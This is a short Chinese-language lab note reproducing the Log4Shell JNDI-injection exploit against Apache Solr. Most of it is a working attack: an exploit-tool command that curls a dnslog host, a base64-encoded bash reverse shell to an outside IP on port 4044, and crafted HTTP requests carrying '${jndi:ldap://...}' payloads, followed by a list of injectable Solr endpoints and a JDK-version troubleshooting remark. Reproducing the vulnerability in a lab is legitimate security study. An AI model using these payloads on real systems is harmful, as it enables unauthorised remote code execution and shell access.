# RCE

 

使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 工具，执行以下命令：

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl rce.kzeb48.dnslog.cn" -A "8.129.237.254"



Tips：这里选择JDK 1.7/1.8的payload都是可以的。

将请求包改成如下：

GET /solr/admin/info?d=${jndi:ldap://8.129.237.254:1389/tgl9ui} HTTP/1.1Host: 192.168.160.135:8983User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://192.168.160.135:8983/solr/




# 反弹shell

 

执行反弹 shell 命令需要编码

在线编码：https://www.jackson-t.ca/runtime-exec-payloads.html



使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 工具，执行以下命令：

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEyOS4yMzcuMjU0LzQwNDQgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "8.129.237.254"



将请求包改成如下：

GET /solr/admin/info?d=${jndi:ldap://8.129.237.254:1389/4gyz6z} HTTP/1.1Host: 192.168.160.135:8983User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://192.168.160.135:8983/solr/




存在漏洞的地址：

1、/solr/admin/info?d=payload
2、/solr/admin/cores?action=payload
3、"Core Admin" -> "Add Core" -> "name"处


# 踩坑日志


起初我用的环境是
https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193
但是在复现过程中，发现只能够成功解析DNS，但是不能RCE。后来发现原来是JDK版本问题。所以刚好应证了上一篇文章里我所提到的一句话。
并不是所有使用了Log4j2的项目都会受到漏洞影响。因为该漏洞的利用涉及RMI和LDAP协议，然而RMI和LDAP协议受JDK版本影响。
